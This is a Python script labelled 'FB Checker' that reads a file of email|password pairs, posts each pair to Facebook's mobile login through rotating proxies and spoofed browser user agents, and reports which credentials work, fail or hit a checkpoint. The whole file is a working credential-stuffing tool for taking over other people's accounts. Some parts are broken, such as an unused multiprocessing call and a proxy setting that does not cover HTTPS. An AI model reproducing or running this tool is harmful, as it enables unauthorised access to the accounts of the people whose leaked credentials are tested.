import requests
import re
import sys, os, json
import random
import threading
import multiprocessing

R = '\033[31m'   # Red
N = '\033[1;37m' # White
G = '\033[32m'   # Green
O = '\033[0;33m' # Orange
B = '\033[1;34m' # Blue
C = '\033[36m' # cyan

def banner():
	print ("""
		\033[32m
 _____  ____          __  __ __    ___     __  __  _    ___  ____  
|     ||    \        /  ]|  T  T  /  _]   /  ]|  l/ ]  /  _]|    \ 
|   __j|  o  )      /  / |  l  | /  [_   /  / |  ' /  /  [_ |  D  )
|  l_  |     T     /  /  |  _  |Y    _] /  /  |    \ Y    _]|    / 
|   _] |  O  |    /   \_ |  |  ||   [_ /   \_ |     Y|   [_ |    \ 
|  T   |     |    \     ||  |  ||     T\     ||  .  ||     T|  .  Y
l__j   l_____j     \____jl__j__jl_____j \____jl__j\_jl_____jl__j\_j
                                                                   
Coded by : KyuRazz 
version  : 1.0
                                                                            
""")

class cek:
	def __init__(self):
		self.agen = [

   #Chrome
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    #Firefox
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
]
		self.proxi = [
'http://78.160.160.70',
'http://95.239.10.204',
'http://205.202.42.230',
'http://186.148.168.91',
'http://113.252.222.73',
'http://203.107.135.125',
'http://80.48.119.28',
'http://159.203.20.110',
'http://178.128.153.253',
'http://104.248.123.136',
'http://157.230.149.54'

   
]
		self.list = input("Your List =>  ")
		self.url = ("https://m.facebook.com/login/?ref=dbl&fl")
	def ceker(self):
		try:
			iyain = random.choice(self.agen)
			just = {'User-Agent':iyain}
			okedeh = random.choice(self.proxi)
			ape = {'http':okedeh}
			self.file = open(self.list, "r").readlines()
			for x in self.file:
				yaw = x.strip()
				zzz = yaw.split("|")
				a = (zzz[0])
				b = (zzz[1])
				data1 = {'email':a,
	             		 'pass' :b
		      			  }								
				pos = requests.post(self.url, data=data1, headers=just, proxies=ape)
				proc = multiprocessing.Process(target=pos, args=(10,20))
				minezuni = re.findall(r'<title>(.*?)</title>', pos.text)
				if "Facebook" in minezuni:
					print ("\033[32m[WORK]{} | {}" .format(a,b))
				elif "Masuk Facebook | Facebook" in minezuni:
	  				print ("\033[31m[DIE]{} | {}" .format(a,b))
				elif "Harap Konfirmasikan Identitas Anda" in minezuni:
	  				print ("\033[32m[CHECK POINT]{} | {}" .format(a,b))
		except IndexError:
	  		print("ERROR : Cek List mu, ada bagian yg kosong")
		except KeyboardInterrupt:
	  		print("CTRL+C Pressed")

if __name__ == "__main__":
	os.system('clear')
	banner()
	zek = cek()
	zek.ceker()
